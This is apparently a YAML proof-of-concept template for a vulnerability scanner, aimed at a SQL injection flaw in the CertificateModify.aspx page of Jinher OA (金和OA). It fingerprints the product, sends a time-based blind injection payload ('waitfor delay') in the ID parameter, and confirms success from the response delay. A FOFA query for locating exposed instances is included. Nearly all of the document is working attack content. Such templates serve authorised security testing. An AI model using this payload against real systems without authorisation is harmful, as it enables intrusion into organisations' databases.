id: poc-yaml-jinher-jhsoft-certificatemodify-aspx-sqli
info:
  name: 金和OA CertificateModify.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Certificate/CertificateModify.aspx/?ID=1'waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"证书修改") &&

    contains(gbk_decode(body),"用户编号") &&

    contains(gbk_decode(body),"设备编号") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
